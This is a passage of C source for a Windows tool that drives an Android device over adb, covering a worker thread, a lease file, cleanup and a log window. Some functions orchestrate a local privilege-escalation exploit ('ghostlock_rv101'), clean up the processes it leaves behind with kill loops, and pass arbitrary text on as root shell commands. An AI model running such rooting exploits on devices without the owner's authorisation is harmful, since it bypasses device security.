    adb_logged(L"shell \"cat > /data/local/tmp/zl_led.sh\"", LED_SCRIPT, 40000);
    adb_logged(L"shell \"chmod 755 /data/local/tmp/zl_led.sh\"", NULL, 30000);

    char *out = root_cmd(off ? "sh /data/local/tmp/zl_led.sh off"
                             : "sh /data/local/tmp/zl_led.sh on", 60000);
    if (out) {
        trim_crlf(out);
        if (*out) log_u8(out);
        free(out);
    }
    log_msg(off ? STR_LOG_LED_OFF : STR_LOG_LED_ON);
}

/* ---------------- 自訂指令 ---------------- */

/*
 * wcmd 由 UI 執行緒預先抓取（見 ID_CUSTOM 的處理）。
 * worker 執行緒不得呼叫 GetWindowTextW：一來 g_cmd_edit 可能在語言切換／
 * DPI 變更時被銷毀而成為 NULL，二來跨執行緒讀取控制項會阻塞在 SendMessage。
 * 最嚴重的是失敗時緩衝區未初始化 → 會把堆疊垃圾當成 root 指令送到裝置。
 */
static void do_custom(const wchar_t *wcmd) {
    if (!wcmd || !*wcmd) {
        log_msg(STR_LOG_CUSTOM_EMPTY);
        return;
    }
    char *cmd = wide_to_utf8(wcmd);
    if (!cmd || !*cmd) {
        log_msg(STR_LOG_CUSTOM_EMPTY);
        if (cmd) free(cmd);
        return;
    }
    log_msg(STR_LOG_CUSTOM_HEADER, wcmd);
    if (!require_root()) { free(cmd); return; }

    char *out = root_cmd(cmd, 90000);
    if (out) {
        trim_crlf(out);
        if (*out) log_u8(out);
        free(out);
    } else {
        log_msg(STR_LOG_NO_OUTPUT);
    }
    free(cmd);
}

/* ================= 工作執行緒 ================= */

static DWORD WINAPI worker_thread(LPVOID arg) {
    int op = (int)(INT_PTR)arg;

    if (!adb_available()) goto out;

    switch (op) {
    case OP_REFRESH:   do_refresh(); break;
    case OP_PUSH:      do_push(); break;
    case OP_HELPER:    do_helper(); break;
    case OP_TRIGGER:   do_trigger(); break;
    case OP_ONECLICK:  do_oneclick(); break;
    case OP_VERIFY:    do_verify(); break;
    case OP_GLLOG:
        log_msg(STR_LOG_GLLOG_HEADER, 60);
        adb_logged(L"shell \"tail -n 60 /data/local/tmp/gl_run.log 2>/dev/null\"", NULL, 30000);
        break;
    case OP_REBOOT:
        log_msg(STR_LOG_REBOOT_HEADER);
        adb_logged(L"reboot", NULL, 40000);
        log_msg(STR_LOG_REBOOT_SENT);
        break;
    case OP_CUSTOM: {
        wchar_t *c = g_pending_cmd;
        g_pending_cmd = NULL;
        do_custom(c);
        if (c) free(c);
        break;
    }
    case OP_OTALOCK:   do_ota_lock(1); break;
    case OP_OTAUNLOCK: do_ota_lock(0); break;
    case OP_OTACHECK:  do_ota_check(); break;
    case OP_SHIZUKU:   do_shizuku(); break;
    case OP_SILENT_ON: do_silent(1); break;
    case OP_SILENT_OFF: do_silent(0); break;
    case OP_LED_OFF:   do_led(1); break;
    case OP_LED_ON:    do_led(0); break;
    case OP_POLL:      do_poll(); break;
    default: break;
    }

out:
    prog_set(-1);
    /*
     * 狀態列復原：do_refresh / do_verify / do_oneclick 會自行設定有意義的狀態，
     * 其餘操作（push / helper / trigger / silent / led / ota …）沒有，
     * 若不補一個終態，狀態列會永遠停在「執行中…」。
     */
    if (InterlockedCompareExchange(&g_cancel, 0, 0) != 0) {
        stat_msg(STR_ST_CANCELLED);
    } else {
        switch (op) {
        case OP_REFRESH:
        case OP_VERIFY:
        case OP_ONECLICK:
            break;                    /* 這些操作已自行設定狀態列 */
        default:
            stat_msg(STR_ST_READY);
            break;
        }
    }
    if (op != OP_POLL) lease_drop();   /* 讓給 App 端 keeper */
    PostMessageW(g_main, WM_BUSY, 0, 0);
    return 0;
}

/*
 * 注意：`do_poll()` 目前**沒有被派送到** —— `poll_thread()` 直接呼叫 `do_refresh()`，
 * 而 `OP_POLL` 沒有任何地方用 `start_op()` 啟動。保留它是為了不破壞既有結構，
 * 但「閒置時觀測開機」必須放在 `poll_thread()`（真正的 30 秒路徑）才會生效。
 */
static void do_poll(void) { do_refresh(); }

static DWORD WINAPI poll_thread(LPVOID arg) {
    (void)arg;
    InterlockedExchange(&g_quiet_probe, 1);
    /*
     * 閒置觀測開機（quiet）：裝置在閒置期間重開時把開機時間記進 boot_hist，
     * 這樣即使使用者沒按一鍵，迴圈歷史也會累積 —— 一鍵前的預檢才有資料可判斷。
     * quiet 不寫紀錄，否則每 30 秒洗一次版。
     */
    loop_note_boot(1);
    do_refresh();
    InterlockedExchange(&g_quiet_probe, 0);
    /* 工作進行中就續約，避免租約過期被 App 端搶走（一鍵最長可跑 80 分鐘） */
    if (InterlockedCompareExchange(&g_busy, 0, 0) != 0) lease_write();
    InterlockedExchange(&g_polling, 0);
    PostMessageW(g_main, WM_INFO, 0, 0);     /* 觸發重繪 */
    return 0;
}

static void start_poll(void) {
    if (InterlockedCompareExchange(&g_busy, 0, 0) != 0) return;
    if (InterlockedCompareExchange(&g_polling, 1, 0) != 0) return;
    HANDLE h = CreateThread(NULL, 0, poll_thread, NULL, 0, NULL);
    if (h) CloseHandle(h);
    else   InterlockedExchange(&g_polling, 0);
}

/* ================= 殘留程序清理 =================
 *
 * exploit 失敗時會洩漏大量 ghostlock_rv101 程序（實測 492 → 516，
 * 系統負載衝到 347，adb 指令開始逾時）。一鍵開始前先清一次，
 * 避免在已經很亂的裝置上疊加新的嘗試。
 *
 * 一定要用 ps 取 PID 再逐一 kill，**不能用 pkill -f**：
 * pkill -f 的 pattern 會匹配到執行它的 adb shell 指令本身，
 * 造成 shell 自殺（實測退出碼 137，整個清理中斷）。
 */
/*
 * 以 **host 端過濾** 計算符合樣式的行程數。
 *
 * 為什麼不用裝置端 `grep -c`：`ps -A -o ARGS | grep -c <樣式>` 會把「執行這條指令的
 * sh -c」自己也算進去（它的 cmdline 就含那個樣式），數字會多 1～2。
 * 本工具其他地方踩過這個坑（`daemon_alive` 之所以用 `>0` 而不是 `==1` 也是同源）。
 */
static int count_procs_matching(const char *pat) {
    char *o = adb_out(L"shell \"ps -A -o ARGS 2>/dev/null\"", NULL, 30000);
    if (!o) return 0;
    int n = 0;
    for (char *line = strtok(o, "\r\n"); line; line = strtok(NULL, "\r\n")) {
        if (strstr(line, pat)) n++;
    }
    free(o);
    return n;
}

/*
 * 清掉殘留的 exploit **以及產生它的來源**。
 *
 * 為什麼不能只殺 ghostlock_rv101：
 *   若 helper 還活著，它會依 `last.cmd` **繼續**重試 exploit，清理永遠追不上
 *   （殺掉一批子程序，helper 又生一批）。helper 變孤兒的典型情境：
 *   工具被強制結束／當掉（helper 的 PPID 變成 1），或一鍵跑到一半被取消。
 *   實測（2026-09-13）就是這樣留下 515～996 個程序、load 破百，
 *   裝置也因此反覆重開機。
 *
 * 順序很重要：**先殺 helper（斷源）→ 再殺 exploit → 最後清觸發檔**。
 * 反過來的話，清空信箱後 helper 可能又收到新的 last.cmd 而復活。
 * 用 `[g]hostlock...` 字元類別是為了避免 grep 匹配到自己這條 adb shell。
 *
 * ## 為什麼需要第二段（root 通道）
 *
 * exploit **提權成功之後它的行程屬於 uid 0**，而 adb shell 是 uid 2000 ——
 * `kill` 會回 EPERM，殺不掉。實測（2026-09-13）裝置上就留了一個
 * `uid=0 ppid=1` 的 `ghostlock_rv101` 孤兒，第一段怎麼清都清不掉，
 * 而且它會讓後續的「乾淨狀態」判斷失準。
 *
 * 所以：第一段之後若**還有殘留**且 root 通道活著，就用 root 身分再清一次。
 * 這與 deploy 側 `proc_util.sh` 的 `kill_matching_escalating` 是同一個策略，
 * 也是「只有 root 能收拾 root」的同一條原則。
 */
static int cleanup_stray_exploits(void) {
    /* ---- 第 1 段：adb shell（uid 2000）---- */
    char *out = adb_out(L"shell \""
        L"n=0; "
        L"for p in $(ps -A -o PID,ARGS 2>/dev/null | grep '[g]hostlock_bridge_helper_deskto' | awk '{print $1}'); "
        L"do kill -9 $p 2>/dev/null && n=$((n+1)); done; "
        L"for p in $(ps -A -o PID,ARGS 2>/dev/null | grep '[g]hostlock_rv101' | awk '{print $1}'); "
        L"do kill -9 $p 2>/dev/null && n=$((n+1)); done; "
        L"rm -f /data/local/tmp/ghostlock_bridge_desktop/last.cmd "
        L"/data/local/tmp/ghostlock_bridge_desktop/payload.staging 2>/dev/null; "
        L"echo $n\"", NULL, 60000);
    int n = 0;
    if (out) {
        trim_crlf(out);
        n = (*out) ? atoi(out) : 0;
        free(out);
    }

    /* ---- 第 2 段：還有殘留 → 用 root 通道再清一次 ---- */
    int left = count_procs_matching("ghostlock_rv101");
    if (left > 0 && daemon_alive()) {
        char *id = root_cmd("id", 20000);
        int is_root = (id && strstr(id, "uid=0") != NULL);
        if (id) free(id);
        if (is_root) {
            /* 殘留的 uid 0 行程只有 root 殺得掉；helper 也一併再掃一次，
             * 因為它可能有 root 身分的變體或子程序。 */
            char *r = root_cmd(
                "for p in $(ps -A -o PID,ARGS 2>/dev/null | grep '[g]hostlock_rv101' | awk '{print $1}'); "
                "do kill -9 $p 2>/dev/null; done; "
                "for p in $(ps -A -o PID,ARGS 2>/dev/null | grep '[g]hostlock_bridge_helper_deskto' | awk '{print $1}'); "
                "do kill -9 $p 2>/dev/null; done; echo done", 60000);
            if (r) free(r);
            int after = count_procs_matching("ghostlock_rv101");
            if (after < left) n += (left - after);
        }
    }

    if (n > 0) log_msg(STR_LOG_STRAY_CLEANED, n);
    return n;
}

/* ================= 操作租約 =================
 *
 * exploit 本體（ghostlock_rv101、.ghostlock_root.sh、gl_run.log）無法像
 * helper 與信箱那樣一分為二，App 端的 keeper 與桌面工具勢必會搶。
 * 因此用一個固定路徑的租約檔序列化：先搶到的人做，另一邊讓。
 *
 * 檔案內容：owner=desktop|app  pid=<pid>  ts=<unix 秒>
 * 有效期限 LEASE_TTL_SEC；持有者需在工作期間持續續約（見 poll_thread）。
 */
#define LEASE_TTL_SEC 900

static long lease_age_sec(const char *txt) {
    const char *p = (txt && *txt) ? strstr(txt, "ts=") : NULL;
    if (!p) return -1;
    long ts = atol(p + 3);
    if (ts <= 1000000000L) return -1;
    return (long)time(NULL) - ts;
}

/* 1 = 租約被「別人」有效持有；0 = 空閒／過期／自己持有 */
static int lease_held_by_other(void) {
    char *t = adb_out(L"shell \"cat " DEV_LEASE L" 2>/dev/null\"", NULL, 20000);
    int other = 0;
    if (t) {
        trim_crlf(t);
        if (*t) {
            long age = lease_age_sec(t);
            int mine = (strstr(t, "owner=desktop") != NULL);
            if (age >= 0 && age <= LEASE_TTL_SEC && !mine) other = 1;
        }
        free(t);
    }
    return other;
}

/*
 * 寫入租約。與 App（RootDaemonKeeper）／deploy（lease.sh）共用同一套約定：
 *   - 先 `mkdir -p` + `chmod 777`：目錄若不存在，App 無法自行建立（見 DEV_LEASE 說明）
 *   - 先寫暫存檔再 `mv`（同目錄原子操作）：避免對方讀到半截內容，
 *     截斷的 `ts=` 會被判為「過期」而搶進
 *   - 順手清掉舊路徑的租約檔，避免遷移期間兩份租約並存
 */
static void lease_write(void) {
    wchar_t sub[800];
    swprintf(sub, 800,
             L"shell \"mkdir -p " DEV_LEASE_DIR L" 2>/dev/null; "
             L"chmod 777 " DEV_LEASE_DIR L" 2>/dev/null; "
             L"rm -f " DEV_LEASE_LEGACY L" 2>/dev/null; "
             L"echo 'owner=desktop pid=%d ts='$(date +%%s) > " DEV_LEASE L".tmp "
             L"&& mv " DEV_LEASE L".tmp " DEV_LEASE L" "
             L"&& chmod 666 " DEV_LEASE L"\"",
             (int)GetCurrentProcessId());
    adb_logged(sub, NULL, 20000);
}

/*
 * 釋放租約＝寫入「已釋放」標記，**不刪除檔案**（與 App／deploy 一致）。
 *
 * 原本是 `rm -f`。改成標記的三個理由：
 *   1. 刪除後 App 一度無法重建（舊路徑 /data/local/tmp 對 App 不可寫），
 *      導致 App 在「沒持租約」的情況下跑 exploit —— 已在 2026-09-13 修正路徑。
 *   2. **沒有空窗**：刪除與重建之間，對方會讀到「檔案不存在」＝無租約＝可搶，
 *      這正是 TOCTOU 的溫床；寫標記是一次覆寫，不會出現那個狀態。
 *   3. 三方一致，不必各自判斷自己有沒有刪除權。
 *
 * `ts=0` 不通過有效性檢查（本檔 lease_age_sec 要求 ts > 1000000000），
 * 因此等價於「已釋放」。
 */
static void lease_drop(void) {
    adb_logged(L"shell \"printf 'owner=none pid=0 ts=0\\n' > " DEV_LEASE L" 2>/dev/null; "
               L"chmod 666 " DEV_LEASE L" 2>/dev/null; true\"", NULL, 20000);
}

/* 回傳 1 = 已啟動，0 = 已有操作在執行中（或租約被 App 持有） */
static int start_op(int op) {
    if (InterlockedCompareExchange(&g_busy, 1, 0) != 0) {
        log_msg(STR_LOG_BUSY);
        return 0;
    }
    InterlockedExchange(&g_cancel, 0);

    /*
     * App 端 keeper 若正在用同一套 exploit 重建 root，就讓它做完 ——
     * 兩邊同時跑會互相覆寫 .ghostlock_root.sh 與 gl_run.log。
     * 輪詢（OP_POLL）不碰 exploit，不需要租約。
     */
    if (op != OP_POLL) {
        if (lease_held_by_other()) {
            log_msg(STR_LOG_LEASE_BUSY);
            InterlockedExchange(&g_busy, 0);
            return 0;
        }
        lease_write();
    }

    /*
     * 一定要主動通知 UI 進入忙碌狀態。原本只有 worker 結束時送 WM_BUSY(0)，
     * set_busy_ui(1) 是死碼 → 存檔／複製／清除紀錄在執行期間仍可點，
     * 而它們會讀取 worker 正在改的 g_logbuf。
     */
    PostMessageW(g_main, WM_BUSY, 1, 0);

    HANDLE h = CreateThread(NULL, 0, worker_thread, (LPVOID)(INT_PTR)op, 0, NULL);
    if (h) { CloseHandle(h); return 1; }
    InterlockedExchange(&g_busy, 0);
    PostMessageW(g_main, WM_BUSY, 0, 0);
    return 0;
}

/* ================= 剪貼簿 / 存檔 ================= */

static void copy_log_to_clipboard(void) __attribute__((unused));
static void copy_log_to_clipboard(void) {
    drain_log_messages();
    if (!g_logbuf || !g_loglen) { log_msg(STR_LOG_EMPTY); return; }
    size_t bytes = (g_loglen + 1) * sizeof(wchar_t);
    HGLOBAL hg = GlobalAlloc(GMEM_MOVEABLE, bytes);
    if (!hg) { log_msg(STR_LOG_CLIP_FAIL); return; }
    void *dst = GlobalLock(hg);
    if (!dst) { GlobalFree(hg); log_msg(STR_LOG_CLIP_FAIL); return; }
    memcpy(dst, g_logbuf, bytes);
    GlobalUnlock(hg);

    if (!OpenClipboard(g_main)) { GlobalFree(hg); log_msg(STR_LOG_CLIP_FAIL); return; }
    EmptyClipboard();
    if (SetClipboardData(CF_UNICODETEXT, hg)) {
        log_msg(STR_LOG_COPIED);
    } else {
        GlobalFree(hg);
        log_msg(STR_LOG_CLIP_FAIL);
    }
    CloseClipboard();
}

/* 建立「filter\0pattern\0...\0\0」形式的雙 null 結尾字串 */
static void build_filter(wchar_t *out, size_t n) {
    wchar_t pat[MAX_PATH], all[MAX_PATH];
    swprintf(pat, MAX_PATH, L"%ls (*.txt)", T(STR_FILTER_LOG));
    swprintf(all, MAX_PATH, L"%ls", T(STR_FILTER_ALL));
    size_t off = 0;
    const wchar_t *parts[5];
    parts[0] = pat; parts[1] = L"*.txt";
    parts[2] = all; parts[3] = L"*.*";
    parts[4] = NULL;
    for (int i = 0; parts[i] && off + wcslen(parts[i]) + 2 < n; i++) {
        size_t l = wcslen(parts[i]) + 1;
        memcpy(out + off, parts[i], l * sizeof(wchar_t));
        off += l;
    }
    out[off] = L'\0';
}

static void save_log(void) {
    drain_log_messages();
    if (!g_logbuf || !g_loglen) { log_msg(STR_LOG_EMPTY); return; }

    wchar_t filter[1024];
    build_filter(filter, 1024);

    wchar_t file[MAX_PATH] = L"zero_light_log.txt";
    OPENFILENAMEW ofn;
    memset(&ofn, 0, sizeof(ofn));
    ofn.lStructSize = sizeof(ofn);
    ofn.hwndOwner = g_main;
    ofn.lpstrFilter = filter;
    ofn.lpstrFile = file;
    ofn.nMaxFile = MAX_PATH;
    ofn.lpstrTitle = T(STR_DLG_PICK_LOG_TITLE);
    ofn.lpstrDefExt = L"txt";
    ofn.Flags = OFN_OVERWRITEPROMPT | OFN_PATHMUSTEXIST;

    if (!GetSaveFileNameW(&ofn)) return;   /* 使用者取消 */

    /* 以 UTF-8 with BOM 寫出，跨平台可讀 */
    HANDLE f = CreateFileW(file, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                           FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE) {
        log_msg(STR_LOG_SAVE_FAIL, file);
        return;
    }
    DWORD w = 0;
    const unsigned char bom[3] = { 0xEF, 0xBB, 0xBF };
    WriteFile(f, bom, 3, &w, NULL);
    char *u8 = wide_to_utf8(g_logbuf);
    if (u8) {
        WriteFile(f, u8, (DWORD)strlen(u8), &w, NULL);
        free(u8);
    }
    CloseHandle(f);
    log_msg(STR_LOG_SAVED, file);
}

/* ================= 檔案選擇 ================= */

static int pick_file(wchar_t *out, size_t n, const wchar_t *title,
                     const wchar_t *desc, const wchar_t *pat) {
    wchar_t filter[1024];
    size_t off = 0;
    const wchar_t *parts[5];
    parts[0] = desc; parts[1] = pat;
    parts[2] = T(STR_FILTER_ALL); parts[3] = L"*.*";
    parts[4] = NULL;
    for (int i = 0; parts[i] && off + wcslen(parts[i]) + 2 < 1024; i++) {
        size_t l = wcslen(parts[i]) + 1;
        memcpy(filter + off, parts[i], l * sizeof(wchar_t));
        off += l;
    }
    filter[off] = L'\0';

    OPENFILENAMEW ofn;
    memset(&ofn, 0, sizeof(ofn));
    out[0] = L'\0';
    ofn.lStructSize = sizeof(ofn);
    ofn.hwndOwner = g_main;
    ofn.lpstrFilter = filter;
    ofn.lpstrFile = out;
    ofn.nMaxFile = (DWORD)n;
    ofn.lpstrTitle = title;
    ofn.Flags = OFN_FILEMUSTEXIST | OFN_PATHMUSTEXIST;
    return GetOpenFileNameW(&ofn);
}

/* ================= v3 自繪 UI：狀態與字型 ================= */

/* 由 i18n 的語系字型衍生出三個級別（沿用同一組字型鏈，CJK/泰文/阿拉伯文都正確） */
static HFONT ui_font_at(int pt, int bold) {
    LOGFONTW lf;
    memset(&lf, 0, sizeof(lf));
    HFONT src = i18n_font_ex(bold);
    if (!src || !GetObjectW(src, sizeof(lf), &lf)) return NULL;
    lf.lfHeight = -MulDiv(pt, g_dpi, 72);
    lf.lfWeight = bold ? FW_BOLD : FW_NORMAL;
    lf.lfCharSet = DEFAULT_CHARSET;
    lf.lfQuality = CLEARTYPE_QUALITY;
    return CreateFontIndirectW(&lf);
}

static void ui_make_fonts(void) {
    if (g_font_body)  { DeleteObject(g_font_body);  g_font_body = NULL; }
    if (g_font_bold2) { DeleteObject(g_font_bold2); g_font_bold2 = NULL; }
    if (g_font_small) { DeleteObject(g_font_small); g_font_small = NULL; }
    g_font_body  = ui_font_at(10, 0);
    g_font_bold2 = ui_font_at(10, 1);
    g_font_small = ui_font_at(9, 0);
}

/* ================= 紀錄（Rich Edit，分級上色） ================= */

#define LOGCLS L"RICHEDIT50W"

static void logbuf_clear(void) {
    g_loglen = 0;
    if (g_logbuf) g_logbuf[0] = L'\0';
    g_log_lines = 0;
    g_logtail_n = 0;
    g_logtail[0][0] = g_logtail[1][0] = L'\0';
}

/* 依行首標記決定顏色：0 一般 / 1 成功 / 2 警告 / 3 錯誤 / 4 淡化 */
static COLORREF log_level_color(const wchar_t *s, int *level) {
    const wchar_t *p = s;
    while (*p && *p != L']') p++;
    if (*p == L']') p++;
    while (*p == L' ') p++;
    *level = 0;
    if (p[0] == L'[' && p[2] == L']') {
        switch (p[1]) {
        case L'+': *level = 1; break;
        case L'!': *level = 3; break;
        case L'?': *level = 2; break;
        case L'i': *level = 4; break;
        default: break;
        }
    }
    if (wcsstr(s, L"====") || wcsstr(s, L"---")) *level = (*level == 3) ? 3 : 4;
    switch (*level) {
    case 1:  return TH(TC_OK);
    case 2:  return TH(TC_SEC);
    case 3:  return TH(TC_ERR);
    case 4:  return TH(TC_TEXT3);
    default: return TH(TC_TEXT);
    }
}

static void log_append_ui(const wchar_t *s) {
    if (!g_log || !s) return;
    int len = GetWindowTextLengthW(g_log);
    SendMessageW(g_log, EM_SETSEL, (WPARAM)len, (LPARAM)len);

    CHARFORMAT2W cf;
    memset(&cf, 0, sizeof(cf));
    cf.cbSize = sizeof(cf);
    cf.dwMask = CFM_COLOR;
    cf.crTextColor = log_level_color(s, &(int){0});
    SendMessageW(g_log, EM_SETCHARFORMAT, SCF_SELECTION, (LPARAM)&cf);

    SendMessageW(g_log, EM_REPLACESEL, 0, (LPARAM)s);
    SendMessageW(g_log, EM_REPLACESEL, 0, (LPARAM)L"\r\n");

    len = GetWindowTextLengthW(g_log);
    SendMessageW(g_log, EM_SETSEL, (WPARAM)len, (LPARAM)len);
    SendMessageW(g_log, EM_SCROLLCARET, 0, 0);
    g_log_lines++;
}

/* 處理佇列中所有 WM_LOG（重建／存檔／複製前呼叫，確保 g_logbuf 最新） */
static void drain_log_messages(void) {
    MSG m;
    while (PeekMessageW(&m, g_main, WM_LOG, WM_LOG, PM_REMOVE)) {
        if (m.lParam) {
            logbuf_append((const wchar_t *)m.lParam);
            free((void *)m.lParam);
        }
    }
}

/* ================= 忙碌狀態 ================= */

static void set_busy_ui(int busy) {
    InterlockedExchange(&g_busy, busy ? 1 : 0);
    if (!busy) { g_prog_show = 0; g_prog_frac = 0.0; }
    ui_calc();
    InvalidateRect(g_main, NULL, TRUE);
}

/* ================= 語言切換 ================= */

static void apply_language(int lang_index_or_minus1) {
    g_lang_setting = lang_index_or_minus1;
    if (lang_index_or_minus1 < 0) {
        int d = i18n_detect_system();
        g_lang = (d >= 0) ? d : LANG_EN;
    } else {
        g_lang = lang_index_or_minus1;
    }
    settings_save();

    LONG_PTR ex = GetWindowLongPtrW(g_main, GWL_EXSTYLE);
    if (i18n_is_rtl()) ex |= WS_EX_LAYOUTRTL | WS_EX_RTLREADING;
    else               ex &= ~(LONG_PTR)(WS_EX_LAYOUTRTL | WS_EX_RTLREADING);
    SetWindowLongPtrW(g_main, GWL_EXSTYLE, ex);

    i18n_make_font(g_main);
    ui_make_fonts();
    drain_log_messages();

    if (g_log)         SendMessageW(g_log, WM_SETFONT, (WPARAM)g_font_body, TRUE);
    if (g_adb_edit)    SendMessageW(g_adb_edit, WM_SETFONT, (WPARAM)g_font_body, TRUE);
    if (g_serial_edit) SendMessageW(g_serial_edit, WM_SETFONT, (WPARAM)g_font_body, TRUE);
    if (g_cmd_edit)    SendMessageW(g_cmd_edit, WM_SETFONT, (WPARAM)g_font_body, TRUE);
    if (g_apk_edit)    SendMessageW(g_apk_edit, WM_SETFONT, (WPARAM)g_font_body, TRUE);

    ui_calc();
    ui_sync_children();
    InvalidateRect(g_main, NULL, TRUE);
    SetWindowTextW(g_main, Tf(STR_APP_TITLE, ZL_VERSION));
    /* 獨立紀錄視窗也要跟著換字型與文字 */
    if (g_lw_font) { DeleteObject(g_lw_font); g_lw_font = NULL; }
    g_lw_font = ui_font_at(10, 0);
    if (g_lw_edit && g_lw_font) SendMessageW(g_lw_edit, WM_SETFONT, (WPARAM)g_lw_font, TRUE);
    for (int i = 0; i < 8; i++)
        if (g_lw_btn[i] && g_lw_font) SendMessageW(g_lw_btn[i], WM_SETFONT, (WPARAM)g_lw_font, TRUE);
    logwin_retitle();
    log_msg(STR_LOG_LANG_CHANGED, g_lang_info[g_lang].endonym);
}

#include "ui_shell.h"

/* ================= 獨立紀錄視窗 =================
 *
 * 為什麼不用浮層：浮層是「自繪在父視窗客戶區上」，但真正的子控制項
 * （EDIT / Rich Edit）永遠畫在父視窗之上，兩者混用就必須手動維護 z 序，
 * 先後踩到 root 指令框、Shizuku APK 欄位、以及浮層按鈕命中失效等問題。
 *
 * 獨立視窗完全沒有這個問題：
 *   - 原生視窗框 → 拖曳／縮放／最小化由作業系統處理
 *   - Rich Edit 與按鈕都是「這個視窗」的子控制項，層級天然正確
 *   - 按鈕用 BS_OWNERDRAW：是真控制項（點擊由系統判定，不會有命中問題），
 *     但外觀仍由 ui_button() 依主題自繪
 */

#define LOGWND_CLASS      L"ZeroLightLogWnd"
#define IDC_LW_EDIT       3101
#define IDC_LW_F_ALL      3102
#define IDC_LW_F_INFO     3103
#define IDC_LW_F_OK       3104
#define IDC_LW_F_WARN     3105
#define IDC_LW_F_ERR      3106
#define IDC_LW_COPY       3107
#define IDC_LW_SAVE       3108
#define IDC_LW_CLEAR      3109

static void rich_append(HWND h, const wchar_t *s, COLORREF col) {
    if (!h || !s || !*s) return;
    int len = GetWindowTextLengthW(h);
    SendMessageW(h, EM_SETSEL, (WPARAM)len, (LPARAM)len);
    CHARFORMAT2W cf;
    memset(&cf, 0, sizeof(cf));
    cf.cbSize = sizeof(cf);
    cf.dwMask = CFM_COLOR;
    cf.crTextColor = col;
    SendMessageW(h, EM_SETCHARFORMAT, SCF_SELECTION, (LPARAM)&cf);
    SendMessageW(h, EM_REPLACESEL, 0, (LPARAM)s);
    SendMessageW(h, EM_REPLACESEL, 0, (LPARAM)L"\r\n");
}

/* 依 g_lw_filter 從 g_logbuf 重建內容 */
static void logwin_populate(void) {
    if (!g_lw_edit) return;
    drain_log_messages();                 /* 確保 g_logbuf 已含所有排隊訊息 */

    /*
     * 內容來源：優先用 g_logbuf；若它為空就退回讀取紀錄卡本身的 Rich Edit。
     * 兩者內容本來就相同，但 g_logbuf 在某些時機可能還沒被填入，
     * 而紀錄卡一定是最新且完整的（實測 g_logbuf 為空時，卡片仍有內容）。
     * 這同時是修正也是保險：紀錄視窗永遠不會沒東西可看。
     */
    wchar_t *owned = NULL;
    const wchar_t *src = NULL;
    if (g_logbuf && *g_logbuf) {
        src = g_logbuf;
    } else if (g_log) {
        int n = GetWindowTextLengthW(g_log);
        if (n > 0) {
            owned = (wchar_t *)malloc((size_t)(n + 2) * sizeof(wchar_t));
            if (owned) { GetWindowTextW(g_log, owned, n + 1); owned[n] = L'\0'; src = owned; }
        }
    }

    SendMessageW(g_lw_edit, WM_SETREDRAW, FALSE, 0);
    SetWindowTextW(g_lw_edit, L"");
    SendMessageW(g_lw_edit, EM_SETBKGNDCOLOR, 0, (LPARAM)TH(TC_CARD2));

    const wchar_t *p = src ? src : L"";
    int shown = 0;
    while (*p) {
        const wchar_t *nl = wcschr(p, L'\n');
        size_t n = nl ? (size_t)(nl - p) : wcslen(p);
        while (n > 0 && (p[n-1] == L'\r' || p[n-1] == L' ')) n--;
        if (n > 0) {
            wchar_t line[4096];
            size_t c = (n < 4095) ? n : 4095;
            memcpy(line, p, c * sizeof(wchar_t));
            line[c] = L'\0';
            int lv = 0;
            COLORREF col = log_level_color(line, &lv);
            int pass = (g_lw_filter < 0)
                    || (g_lw_filter == 0 ? (lv == 0 || lv == 4) : lv == g_lw_filter);
            if (pass) { rich_append(g_lw_edit, line, col); shown++; }
        }
        if (!nl) break;
        p = nl + 1;
    }
    if (owned) free(owned);
    if (shown == 0) {
        rich_append(g_lw_edit, T(STR_LOG_EMPTY), TH(TC_TEXT3));
    }
    SendMessageW(g_lw_edit, WM_SETREDRAW, TRUE, 0);
    InvalidateRect(g_lw_edit, NULL, TRUE);
}

/* 篩選鈕的狀態文字 */
static void logwin_sync_buttons(void) {
    for (int i = 0; i < 8; i++) if (g_lw_btn[i]) InvalidateRect(g_lw_btn[i], NULL, TRUE);
}

static void logwin_layout(HWND h) {
    RECT cr; GetClientRect(h, &cr);
    int cw = cr.right, ch = cr.bottom;
    int dpi = g_dpi;
    int bar = MulDiv(40, dpi, 96), pad = MulDiv(10, dpi, 96), gap = MulDiv(6, dpi, 96);
    int bh = MulDiv(28, dpi, 96);
    int x = pad;
    for (int i = 0; i < 5; i++) {
        int w = MulDiv(56, dpi, 96);
        if (g_lw_btn[i]) SetWindowPos(g_lw_btn[i], NULL, x, (bar - bh) / 2, w, bh, SWP_NOZORDER);
        x += w + gap;
    }
    /* 右側動作鈕 */
    int rx = cw - pad;
    for (int i = 7; i >= 5; i--) {
        int w = MulDiv(64, dpi, 96);
        rx -= w;
        if (g_lw_btn[i]) SetWindowPos(g_lw_btn[i], NULL, rx, (bar - bh) / 2, w, bh, SWP_NOZORDER);
        rx -= gap;
    }
    if (g_lw_edit)
        SetWindowPos(g_lw_edit, NULL, pad, bar, cw - 2 * pad, ch - bar - pad, SWP_NOZORDER);
}

static void logwin_apply_theme(void) {
    if (g_lw_edit) {
        SendMessageW(g_lw_edit, EM_SETBKGNDCOLOR, 0, (LPARAM)TH(TC_CARD2));
    }
    if (g_logwnd) InvalidateRect(g_logwnd, NULL, TRUE);
    logwin_sync_buttons();
}

static LRESULT CALLBACK logwnd_proc(HWND h, UINT m, WPARAM w, LPARAM l) {
    switch (m) {
    case WM_SIZE:
        logwin_layout(h);
        return 0;

    case WM_ERASEBKGND: {
        HDC dc = (HDC)w;
        RECT r; GetClientRect(h, &r);
        HBRUSH b = CreateSolidBrush(TH(TC_BG));
        FillRect(dc, &r, b);
        DeleteObject(b);
        return 1;
    }

    /* owner-draw 按鈕：外觀走主題，但點擊判定由系統負責（不會有自繪命中的問題） */
    case WM_DRAWITEM: {
        DRAWITEMSTRUCT *di = (DRAWITEMSTRUCT *)l;
        if (di->CtlType != ODT_BUTTON) break;
        zl_ui u;
        memset(&u, 0, sizeof(u));
        u.dc = di->hDC;
        u.dpi = g_dpi;
        u.font = u.font_b = g_lw_font ? g_lw_font : g_font_body;
        u.font_s = g_font_small;
        cv_begin(&u.cv, di->hDC);
        RECT rc = di->rcItem;
        int cw = rc.right - rc.left, chh = rc.bottom - rc.top;
        wchar_t txt[64] = L"";
        GetWindowTextW(di->hwndItem, txt, 64);
        ui_state st = (di->itemState & ODS_DISABLED) ? ST_DISABLED
                    : (di->itemState & ODS_SELECTED) ? ST_PRESSED : ST_NORMAL;
        /* 目前生效的篩選以 BTN_PRIMARY 突顯 */
        int id = (int)di->CtlID;
